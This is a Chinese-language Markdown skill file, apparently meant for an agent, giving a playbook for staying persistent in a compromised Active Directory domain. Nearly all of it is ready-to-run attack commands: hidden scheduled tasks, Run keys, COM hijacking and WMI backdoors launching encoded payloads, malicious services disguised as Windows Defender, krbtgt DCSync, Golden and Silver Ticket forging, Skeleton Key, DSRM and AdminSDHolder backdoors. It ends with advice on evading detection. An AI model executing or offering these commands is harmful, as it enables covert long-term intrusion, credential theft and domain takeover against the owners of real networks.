---
name: ad-persistence
description: "AD 域环境持久化技术。当已获取域管/本地管理员权限、需要建立持久访问以确保重启或密码更改后仍能回到目标环境时使用。覆盖主机级持久化（计划任务/注册表Run/COM劫持/WMI事件订阅/Windows服务/启动文件夹）、域级持久化（Golden Ticket/Silver Ticket/Skeleton Key/DSRM/AdminSDHolder）、DCShadow/GoldenGMSA高级技术、清理命令与检测规避"
metadata:
  tags: "persistence,golden-ticket,silver-ticket,skeleton-key,dsrm,adminsdholder,scheduled-task,com-hijack,wmi-subscription,registry-run,sharpersist,dcshadow,goldengmsa,shadow-principals,pam-trust,delegation-to-krbtgt,kds-root-key"
  category: "lateral"
---

# AD 持久化方法论

获取高权限后的核心目标: 建立持久访问，确保重启/密码更改后仍能回到目标环境。

## 深入参考（必读）

- 主机级持久化完整命令与清理 → [references/host-persistence.md](references/host-persistence.md)
- 域级持久化完整命令与清理 → [references/domain-persistence.md](references/domain-persistence.md)
- → [references/advanced-persistence.md](references/advanced-persistence.md) — DCShadow、GoldenGMSA、krbtgt 委派持久化、Shadow Principals (PAM Trust)

---

## Phase 1: 持久化决策

### 1.1 当前权限评估

```powershell
# 检查当前权限
whoami /priv
whoami /groups

# 是否为域管
net group "Domain Admins" /domain

# 是否为本地管理员
net localgroup Administrators
```

### 1.2 决策树

```
[开始] 需要建立持久化
    |
    v
[评估] 当前权限级别?
    |
    +-- 普通域用户 --> 先提权，持久化意义不大
    |
    +-- 本地管理员 / SYSTEM --> [主机级持久化] Phase 2
    |       |
    |       +-- 需要隐蔽 --> COM 劫持 / WMI 事件订阅
    |       +-- 需要可靠 --> 计划任务 / Windows 服务
    |       +-- 仅需用户级 --> 注册表 Run / 启动文件夹
    |
    +-- 域管理员 --> [域级持久化] Phase 3
            |
            +-- 有 krbtgt 哈希 --> Golden Ticket (最强)
            +-- 有服务账户哈希 --> Silver Ticket (隐蔽)
            +-- 有 DC 访问权限 --> Skeleton Key / DSRM
            +-- 需要 ACL 后门 --> AdminSDHolder
```

### 1.3 隐蔽性评估

| 技术 | 检测难度 | 持久时间 | 权限要求 | 推荐场景 |
|------|----------|----------|----------|----------|
| 计划任务 | 中 | 永久 | 用户/SYSTEM | 快速部署 |
| 启动文件夹 | 低 | 永久 | 用户 | 临时/低价值 |
| 注册表 Run | 中 | 永久 | 用户/SYSTEM | 通用 |
| COM 劫持 | 高 | 永久 | 用户 | 长期隐蔽 |
| Windows 服务 | 中 | 永久 | SYSTEM | 系统级访问 |
| WMI 事件订阅 | 高 | 永久 | SYSTEM | 高隐蔽需求 |
| Golden Ticket | 高 | 10 年 | krbtgt 哈希 | 域级最强 |
| Silver Ticket | 高 | 票据有效期 | 服务账户哈希 | 不触及 DC |
| Skeleton Key | 中 | 重启失效 | DC 内存访问 | 临时万能钥匙 |
| DSRM | 高 | 永久 | DC 本地管理员 | 隐蔽后门 |
| AdminSDHolder | 中 | 永久(60min 同步) | 域管理员 | ACL 持久化 |

---

## Phase 2: 主机级持久化

### 2.1 计划任务

**权限**: 用户级或 SYSTEM | **检测难度**: 中

```powershell
# SharPersist - 每小时执行
SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc BASE64" -n "Updater" -m add -o hourly

# schtasks - 开机启动 / 定时执行
schtasks /create /tn "WinDefUpdate" /tr "C:\Windows\Temp\svc.exe" /sc onlogon /ru SYSTEM /f
schtasks /create /tn "HealthCheck" /tr "C:\Windows\Temp\svc.exe" /sc minute /mo 30 /ru SYSTEM /f

# 清理
schtasks /delete /tn "WinDefUpdate" /f
```

### 2.2 启动文件夹

**权限**: 用户 | **检测难度**: 低

```powershell
SharPersist.exe -t startupfolder -c "powershell.exe" -a "-nop -w hidden -enc BASE64" -f "UserEnvSetup" -m add
# 路径: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\

# 清理
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk"
```

### 2.3 注册表 Run 键

**权限**: 用户 (HKCU) / SYSTEM (HKLM) | **检测难度**: 中

```bash
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdate" /t REG_SZ /d "C:\ProgramData\updater.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdate" /t REG_SZ /d "C:\ProgramData\updater.exe" /f

# 清理
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdate" /f
```

> 更多注册表位置 (Winlogon Shell/Userinit, IFEO) 见 [references/host-persistence.md](references/host-persistence.md)

### 2.4 COM 劫持

**权限**: 用户 | **检测难度**: 高

原理: HKCU 中注册同 CLSID 的恶意 DLL，优先于 HKLM 中的正常组件被加载。

```powershell
# 在 HKCU 创建劫持项 (HKLM 中已存在该 CLSID)
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{TARGET-CLSID}"
New-Item -Path "HKCU:Software\Classes\CLSID\{TARGET-CLSID}" -Name "InprocServer32" -Value "C:\Payloads\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{TARGET-CLSID}\InprocServer32" -Name "ThreadingModel" -Value "Both"

# 清理
Remove-Item -Path "HKCU:Software\Classes\CLSID\{TARGET-CLSID}" -Recurse
```

> CLSID 发现方法 (procmon/计划任务枚举) 见 [references/host-persistence.md](references/host-persistence.md)

### 2.5 Windows 服务

**权限**: SYSTEM | **检测难度**: 中

```bash
sc create "WinDefSvc" binPath= "C:\Windows\legit-svc.exe" start= auto DisplayName= "Windows Defender Update"
sc start "WinDefSvc"

# 清理
sc stop "WinDefSvc" && sc delete "WinDefSvc"
```

> SYSTEM 进程无法进行网络 NTLM 认证，应使用 SMB/TCP/DNS 通道而非 HTTP。

### 2.6 WMI 事件订阅

**权限**: SYSTEM | **检测难度**: 高

三组件架构: EventFilter(触发条件) + EventConsumer(执行动作) + FilterToConsumerBinding(绑定)。

```powershell
# PowerLurk 一键创建
Import-Module .\PowerLurk.ps1
Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\artifact.exe" -Trigger ProcessStart -ProcessName notepad.exe

# 清理
Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
```

> 完整三组件 PowerShell/wmic 手动创建代码见 [references/host-persistence.md](references/host-persistence.md)

---

## Phase 3: 域级持久化

### 3.1 Golden Ticket

**要求**: krbtgt NTLM 哈希 (DCSync 获取) | **有效期**: 默认 10 年

```bash
# Linux: DCSync + 伪造 + 使用
impacket-secretsdump DOMAIN/admin:PASS@DC_IP -just-dc-user krbtgt
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

```powershell
# Windows
Rubeus.exe golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-xxx /krbtgt:KRBTGT_HASH /ptt
```

**清理**: 两次更改 krbtgt 密码 (AD 保留前一次密码)。跨域场景 /sids 参数见 references。

### 3.2 Silver Ticket

**要求**: 服务账户 NTLM 哈希 | **优势**: 不触及 DC

```bash
ticketer.py -nthash SVC_HASH -domain-sid S-1-5-21-xxx -domain domain.local -spn cifs/target.domain.local Administrator
```

```powershell
Rubeus.exe silver /service:cifs/TARGET /user:Administrator /domain:DOMAIN /sid:S-1-5-21-xxx /rc4:SVC_HASH /ptt
```

常用 SPN: `cifs/HOST`(文件), `HOST/DC`(PsExec), `MSSQLSvc/DB`(SQL), `LDAP/DC`(DCSync)。**清理**: 更改服务账户密码。

### 3.3 Skeleton Key

**要求**: DC 内存访问 (域管 + SeDebugPrivilege) | **有效期**: 直到 DC 重启

```powershell
mimikatz # privilege::debug
mimikatz # misc::skeleton
# 所有域用户均可使用密码 "mimikatz" 登录，原密码仍有效
```

**清理**: 重启域控即可。仅内存级，需配合其他技术。

### 3.4 DSRM (目录服务还原模式)

**要求**: DC 本地管理员 | **有效期**: 永久

```powershell
mimikatz # lsadump::sam                  # 获取 DSRM 哈希 (SAM 中 Administrator)
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
sekurlsa::pth /domain:DC_HOSTNAME /user:Administrator /ntlm:DSRM_HASH /run:powershell.exe
```

**清理**: `Remove-ItemProperty "HKLM:\...\Lsa\" -Name "DsrmAdminLogonBehavior"`

### 3.5 AdminSDHolder

**要求**: 域管理员 | SDProp 每 60 分钟同步 ACL 到所有受保护对象

```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All
```

```bash
impacket-dacledit -action write -rights FullControl -principal attacker -target "CN=AdminSDHolder,CN=System,DC=domain,DC=local" DOMAIN/admin:PASS -dc-ip DC_IP
```

**清理**: `Remove-DomainObjectAcl ... -PrincipalIdentity attacker -Rights All` + 等 SDProp 同步

---

## Phase 4: 清理与检测规避

### 4.1 清理命令速查

| 技术 | 安装命令 | 清理命令 |
|------|----------|----------|
| 计划任务 | `schtasks /create /tn NAME ...` | `schtasks /delete /tn NAME /f` |
| 启动文件夹 | SharPersist `-m add` | `Remove-Item ...Startup\NAME.lnk` |
| 注册表 Run | `reg add ...Run /v NAME` | `reg delete ...Run /v NAME /f` |
| COM 劫持 | `New-Item HKCU:...CLSID` | `Remove-Item HKCU:...CLSID -Recurse` |
| Windows 服务 | `sc create NAME` | `sc stop NAME && sc delete NAME` |
| WMI 事件 | `Register-MaliciousWmiEvent` | `Get-WmiEvent NAME \| Remove-WmiObject` |
| Golden Ticket | `ticketer.py -nthash` | 两次更改 krbtgt 密码 |
| Silver Ticket | `ticketer.py -spn` | 更改服务账户密码 |
| Skeleton Key | `misc::skeleton` | 重启域控制器 |
| DSRM | 修改 DsrmAdminLogonBehavior | 删除注册表项 |
| AdminSDHolder | `Add-DomainObjectAcl` | `Remove-DomainObjectAcl` + 等待 SDProp |

### 4.2 检测规避要点

```
主机级:
  - 任务名称模仿合法系统任务 (Windows Defender, Microsoft Update)
  - 二进制文件放置在合法路径 (C:\Windows, C:\ProgramData)
  - 使用 DLL 劫持而非独立 EXE
  - WMI 触发条件设置合理间隔，避免频繁执行

域级:
  - Golden Ticket 用户名使用真实存在的用户
  - Silver Ticket 只针对需要的特定服务
  - 避免跨域使用伪造票据 (日志异常)
  - AdminSDHolder 添加低调权限而非 FullControl
```

---

## 组合策略

```
最大持久性 (多层冗余):
  域管: Golden Ticket + AdminSDHolder + 计划任务
  本管: WMI 事件订阅 + COM 劫持 + 注册表 Run

最大隐蔽 (单一精准):
  域管: Silver Ticket (仅特定服务，不触及 DC)
  本管: COM 劫持 (DLL 形式，检测难度最高)
```

---

## 常见问题

- **计划任务被删除?** -- 换用 COM 劫持或 WMI 事件订阅，WMI 三组件全删才能清除
- **Golden Ticket 不工作?** -- 确认 krbtgt 哈希正确、域 SID 正确、时间偏差 < 5 分钟
- **Skeleton Key 重启失效?** -- 设计如此(仅内存)，配合 Golden Ticket 或计划任务
- **AdminSDHolder 没生效?** -- SDProp 每 60 分钟运行，手动触发 `Invoke-ADSDPropagation`

---

## 工具参考

| 工具 | 用途 | 平台 |
|------|------|------|
| SharPersist | 多种主机持久化技术 (任务/注册表/服务/COM/启动) | Windows |
| PowerLurk | WMI 事件订阅 | Windows |
| SharpStay | C# 持久化工具 | Windows |
| Rubeus | Golden/Silver Ticket 创建 | Windows |
| Mimikatz | Skeleton Key/DSRM/票据伪造 | Windows |
| ticketer.py | Kerberos 票据伪造 (impacket) | Linux |
| impacket-secretsdump | DCSync 获取哈希 | Linux |
| impacket-dacledit | ACL 修改 (AdminSDHolder) | Linux |
| Incognito | Token 窃取与模拟 | Windows |
